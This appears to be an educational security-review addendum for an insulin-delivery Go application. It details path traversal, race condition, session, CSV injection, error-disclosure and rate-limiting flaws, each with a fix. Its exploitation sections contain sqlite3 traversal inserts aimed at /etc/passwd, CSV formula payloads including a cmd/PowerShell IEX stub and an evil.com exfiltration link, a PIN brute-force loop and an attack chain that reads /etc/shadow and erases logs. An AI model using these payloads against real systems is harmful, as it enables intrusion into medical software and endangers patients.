# Additional Vulnerabilities Found
## Supplementary Security Analysis

**Document Type:** Addendum to VULNERABILITY_ANALYSIS.md  
**Date:** November 2025  
**Status:** Additional findings beyond the 7 required OWASP vulnerabilities

---

## Overview

During deep code analysis, several **additional security vulnerabilities** were identified beyond the primary 7 OWASP-mapped vulnerabilities. These represent defense-in-depth failures and edge cases that could be exploited.

---

## Additional Vulnerability #1: Path Traversal via User ID

### Classification
**OWASP:** A01:2021 – Broken Access Control (Additional Instance)  
**CWE-22:** Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

### Description

Patient IDs are used directly in file path construction without sanitization, allowing path traversal attacks. An attacker who can control or inject a malicious user ID could read/write arbitrary files on the system.

### Vulnerable Code

**File:** `internal/patient/insulinlog.go:29`
```go
filename := filepath.Join(insulinLogDir, fmt.Sprintf("insulin_log_%s.csv", patientID))
file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
```

**File:** `internal/patient/alerts.go`
```go
filename := filepath.Join("alerts", fmt.Sprintf("alerts_log_%s.csv", patientID))
```

**File:** `cmd/main.go:233`
```go
glucoseFile := filepath.Join("glucose", fmt.Sprintf("glucose_readings_%s.csv", userID))
```

### Exploitation

**Scenario 1: Read Arbitrary Files**
```bash
# Create malicious user with path traversal in user_id
sqlite3 Login/aid.db "INSERT INTO users (user_id, full_name, dob, pin_hash, email, role) VALUES ('../../etc/passwd', 'Attacker', '1990-01-01', '\$2a\$10\$hash', 'evil@bad.com', 47293);"

# Login as this user
# Application attempts: filepath.Join("insulinlogs", "insulin_log_../../etc/passwd.csv")
# Results in: insulinlogs/../../etc/passwd.csv -> /etc/passwd.csv (or similar)
```

**Scenario 2: Write to Arbitrary Locations**
```bash
# Malicious user_id: "../../../tmp/malicious"
# File created: insulinlogs/../../../tmp/malicious_insulin_log.csv
# Actual path: /tmp/malicious_insulin_log.csv
```

**Scenario 3: Overwrite System Files**
```bash
# If running as root (bad practice): user_id = "../../etc/cron.d/backdoor"
# Creates: /etc/cron.d/backdoor.csv
# Cron might execute this as a job
```

### Impact

- **Read Sensitive Files:** Access `/etc/passwd`, `/etc/shadow`, configuration files
- **Write Arbitrary Files:** Overwrite application config, create backdoors
- **Denial of Service:** Overwrite critical system files causing crashes
- **Privilege Escalation:** Write to cron directories, systemd units

### Mitigation

The application does have user ID validation in `clinician/register.go`:

```go
func ValidateUserID(userID string) bool {
    matched, _ := regexp.MatchString("^[a-zA-Z0-9]+$", userID)
    return matched && len(userID) >= 4 && len(userID) <= 20
}
```

**However:** This validation is only applied during clinician registration, not enforced at database level or during direct DB manipulation.

**Proper Fix:**
1. Enforce user ID validation at database level (CHECK constraint)
2. Sanitize all file path inputs with `filepath.Clean()`
3. Validate paths stay within expected directories:
```go
func secureFilePath(baseDir, filename string) (string, error) {
    path := filepath.Join(baseDir, filename)
    cleanPath := filepath.Clean(path)
    if !strings.HasPrefix(cleanPath, baseDir) {
        return "", fmt.Errorf("path traversal detected")
    }
    return cleanPath, nil
}
```

---

## Additional Vulnerability #2: Race Condition in Suspension State

### Classification
**CWE-362:** Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')

### Description

The insulin suspension state uses a mutex, but there's a time-of-check to time-of-use (TOCTOU) race condition between checking suspension status and logging insulin delivery.

### Vulnerable Code

**File:** `internal/patient/safety.go:67-77`
```go
func IsInsulinSuspended() bool {
    suspensionState.mu.Lock()
    defer suspensionState.mu.Unlock()

    now := time.Now()
    if suspensionState.isSuspended && now.After(suspensionState.suspendedUntil) {
        suspensionState.isSuspended = false
    }

    return suspensionState.isSuspended
}
```

**File:** `internal/patient/requestbolus.go:16`
```go
if IsInsulinSuspended() {
    // Show warning
    return
}
// ... later, bolus is logged (TOCTOU gap)
```

### Exploitation

**Attack Scenario:**
1. Suspension expires at T+30:00 exactly
2. Attacker requests bolus at T+29:59.9
3. Check passes (still suspended)
4. 0.2 seconds pass (suspension expires)
5. Bolus logs anyway (suspension lifted)

**Race Window:** ~200ms - 1 second

### Impact

- Bypass of critical safety mechanism
- Insulin delivered during hypoglycemia
- Patient harm possible

### Mitigation

```go
// Atomic check-and-log operation
func RequestBolusWithSuspensionCheck(dose float64) error {
    suspensionState.mu.Lock()
    defer suspensionState.mu.Unlock()
    
    // Check suspension with lock held
    if isSuspendedLocked() {
        return errors.New("suspended")
    }
    
    // Log immediately while locked
    return logBolusLocked(dose)
}
```

---

## Additional Vulnerability #3: Weak Session Management

### Classification
**CWE-384:** Session Fixation  
**CWE-613:** Insufficient Session Expiration

### Description

Session management uses global variables without timeout, token rotation, or proper invalidation.

### Vulnerable Code

**File:** `internal/patient/profile.go` (implied from session management)
```go
// Global session variables
var currentDB *sql.DB
var currentUserID string

func SetSession(db *sql.DB, userID string) {
    currentDB = db
    currentUserID = userID
}
```

### Issues

1. **No Session Timeout:** Once logged in, session never expires
2. **No Token Rotation:** Same session throughout application lifetime
3. **Global State:** Race conditions in multi-user scenarios
4. **No Session Invalidation on Privilege Change:** User elevated to clinician keeps same session

### Exploitation

```go
// Attacker leaves terminal open
// Session persists indefinitely
// Any user can use the open session

// Privilege escalation scenario:
// 1. Login as patient PA1993
// 2. Attacker escalates PA1993 to clinician (direct DB)
// 3. Application never re-checks role
// 4. Session continues with old permissions OR
// 5. Restart app -> now has clinician permissions with patient session
```

### Mitigation

```go
type Session struct {
    UserID    string
    Role      int
    Token     string    // UUID
    ExpiresAt time.Time
    CreatedAt time.Time
}

func ValidateSession(token string) (*Session, error) {
    // Check expiration
    if time.Now().After(session.ExpiresAt) {
        return nil, errors.New("session expired")
    }
    
    // Re-verify role from database
    currentRole := fetchRoleFromDB(session.UserID)
    if currentRole != session.Role {
        return nil, errors.New("privilege changed - re-authenticate")
    }
    
    return session, nil
}
```

---

## Additional Vulnerability #4: CSV Injection (Formula Injection)

### Classification
**CWE-1236:** Improper Neutralization of Formula Elements in a CSV File  
**OWASP:** A03:2021 – Injection (Additional Instance)

### Description

CSV files are created with user-controlled data without sanitization. Malicious formulas can be injected that execute when opened in Excel/LibreOffice.

### Vulnerable Code

**File:** `internal/patient/insulinlog.go:39`
```go
record := []string{timestamp, doseType, fmt.Sprintf("%.2f", amount)}
return writer.Write(record)
```

**File:** `internal/patient/alerts.go`
```go
record := []string{alertType, fmt.Sprintf("%.0f", glucose), timestamp}
```

### Exploitation

```bash
# Modify database to inject formula
sqlite3 Login/aid.db "UPDATE users SET full_name = '=1+1+cmd|'/c calc'!A1' WHERE user_id = 'PA1993';"

# If full_name is ever written to CSV (depends on implementation)
# When opened in Excel: formula executes, calculator opens
```

**Payload Examples:**
```
=1+1+cmd|'/c calc'!A1          # Opens calculator (Windows)
=HYPERLINK("http://evil.com")  # Exfiltrates data
=cmd|'/c powershell IEX...'    # Remote code execution
```

### Impact

- Remote code execution when CSV opened
- Data exfiltration via external links
- Phishing attacks

### Mitigation

```go
func sanitizeCSVField(field string) string {
    // Prepend single quote to formulas
    if strings.HasPrefix(field, "=") || 
       strings.HasPrefix(field, "+") ||
       strings.HasPrefix(field, "-") ||
       strings.HasPrefix(field, "@") {
        return "'" + field
    }
    return field
}
```

---

## Additional Vulnerability #5: Information Disclosure via Error Messages

### Classification
**CWE-209:** Generation of Error Message Containing Sensitive Information

### Description

Error messages reveal sensitive system information including file paths, database structure, and user existence.

### Examples

**File Paths Disclosed:**
```go
// From various files
return fmt.Errorf("failed to open log file: %v", err)
// Reveals: /home/aid-system/insulinlogs/insulin_log_PA1993.csv
```

**Database Structure Disclosed:**
```
Error: no such column: BasalRate
// Reveals database schema to attacker
```

**User Enumeration:**
```go
// cmd/main.go:203
if err == sql.ErrNoRows {
    fmt.Println("Invalid credentials (no such user)")
}
```
Attacker can enumerate valid user IDs by trying different values.

### Mitigation

```go
// Generic error messages
if err != nil {
    log.Printf("[ERROR] Database operation failed: %v", err) // Log detail
    return errors.New("authentication failed") // Generic to user
}

// No user enumeration
if userNotFound || passwordWrong {
    return "Invalid credentials" // Same message for both
}
```

---

## Additional Vulnerability #6: No Rate Limiting

### Classification
**CWE-307:** Improper Restriction of Excessive Authentication Attempts

### Description

While the application counts failed login attempts per user, there's no global rate limiting, IP-based blocking, or CAPTCHA.

### Current Implementation

**File:** `cmd/main.go:28-30`
```go
var loginAttempts = make(map[string]int)
const maxLoginAttempts = 5
```

### Weaknesses

1. **Per-User Only:** Attacker can try 5 attempts for 1000 different users (5000 total attempts)
2. **No Time Window:** Counter never resets
3. **No Account Unlock:** Locked accounts never unlock
4. **Memory-Based:** Counter lost on restart

### Exploitation

```bash
# Brute force attack
for user in PA{1..9999}; do
    for pin in {0000..9999}; do
        attempt_login $user $pin
        # 5 attempts per user = millions of total attempts possible
    done
done
```

### Mitigation

```go
type RateLimiter struct {
    attempts map[string][]time.Time // IP -> timestamps
    mu       sync.Mutex
}

func (r *RateLimiter) Allow(ip string) bool {
    r.mu.Lock()
    defer r.mu.Unlock()
    
    now := time.Now()
    window := now.Add(-5 * time.Minute)
    
    // Clean old attempts
    var recent []time.Time
    for _, t := range r.attempts[ip] {
        if t.After(window) {
            recent = append(recent, t)
        }
    }
    
    // Check rate
    if len(recent) >= 20 { // 20 attempts per 5 min
        return false
    }
    
    recent = append(recent, now)
    r.attempts[ip] = recent
    return true
}
```

---

## Summary of Additional Vulnerabilities

| # | Vulnerability | CWE | Severity | Fix Complexity |
|---|---------------|-----|----------|----------------|
| 1 | Path Traversal | CWE-22 | HIGH | Medium (add sanitization) |
| 2 | Race Condition | CWE-362 | MEDIUM | Medium (atomic operations) |
| 3 | Weak Session Mgmt | CWE-384, CWE-613 | MEDIUM | High (redesign sessions) |
| 4 | CSV Injection | CWE-1236 | MEDIUM | Low (sanitize output) |
| 5 | Info Disclosure | CWE-209 | LOW | Low (generic errors) |
| 6 | No Rate Limiting | CWE-307 | MEDIUM | Medium (add limiter) |

---

## Combined Threat Assessment

**Total Vulnerabilities Identified:** 13

- 7 Primary (OWASP Top 10 mapped)
- 6 Additional (defense-in-depth failures)

**Critical:** 2  
**High:** 5  
**Medium:** 5  
**Low:** 1

### Attack Chain Example

Using multiple vulnerabilities together:

```
1. Path Traversal (Vuln #1) → Read /etc/shadow
2. Crack password hashes offline
3. Login with leaked credentials
4. Session never expires (Vuln #3) → Persistent access
5. Direct DB access (Primary Vuln A01) → Privilege escalation
6. CSV Injection (Vuln #4) → Spread to other systems
7. Erase logs (Primary Vuln A09) → Cover tracks
```

---

## Conclusion

These additional vulnerabilities demonstrate that even with the primary 7 OWASP vulnerabilities fixed, the system would still have significant security weaknesses. Defense-in-depth requires:

1. **Input Validation:** All user-controlled data (IDs, file paths, CSV fields)
2. **Output Encoding:** Sanitize data before writing to files/logs
3. **Rate Limiting:** Global and per-user brute force protection
4. **Proper Session Management:** Tokens, timeouts, invalidation
5. **Atomic Operations:** Eliminate race conditions
6. **Error Handling:** Generic messages, detailed logging

**Security Principle:** Assume every layer will be compromised, design accordingly.

---

**Document Version:** 1.0  
**Last Updated:** November 2025  
**Classification:** Educational - Security Research Addendum
